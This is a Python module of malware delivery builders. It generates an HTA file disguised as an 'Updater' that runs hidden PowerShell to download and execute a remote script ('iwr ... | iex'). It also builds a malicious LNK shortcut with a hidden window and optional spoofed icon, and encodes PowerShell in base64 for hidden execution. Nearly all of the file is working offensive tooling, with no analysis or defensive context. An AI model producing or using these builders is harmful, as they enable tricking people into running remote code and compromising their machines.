"""Payload builders for simple delivery artifacts."""

from __future__ import annotations

from base64 import b64encode
from pathlib import Path
from textwrap import dedent

__all__ = ["build_hta", "build_lnk", "save"]

def build_hta(payload_url: str, *, title: str = "Updater") -> str:
    """Generate a minimal HTA that fetches and executes a remote script."""
    return dedent(
        f"""
        <html>
        <head>
        <script>
        var x = new ActiveXObject("WScript.Shell");
        x.run("powershell -nop -w hidden -c \"iwr -useb {payload_url} | iex\"");
        </script>
        <title>{title}</title>
        </head>
        <body>{title}</body>
        </html>
        """
    ).strip()

def build_lnk(
    command: str, *, icon: str | None = None, workdir: str | None = None
) -> str:
    """Return a PowerShell snippet that creates a LNK pointing to `command`."""
    ps = [
        "$W = New-Object -ComObject WScript.Shell",
        "$L = $W.CreateShortcut('payload.lnk')",
        f"$L.TargetPath = '{command}'",
        "$L.WindowStyle = 7",
    ]
    if workdir:
        ps.append(f"$L.WorkingDirectory = '{workdir}'")
    if icon:
        ps.append(f"$L.IconLocation = '{icon}'")
    ps.append("$L.Save()")
    return "; ".join(ps)

def save(content: str, path: str | Path) -> Path:
    """Persist generated payload content to disk."""
    out = Path(path).expanduser().resolve()
    out.write_text(content)
    return out

def inline_base64_ps(script: str) -> str:
    """Encode a PowerShell script for inline execution."""
    data = script.encode("utf-16le")
    encoded = b64encode(data).decode()
    return f"powershell -nop -w hidden -enc {encoded}"
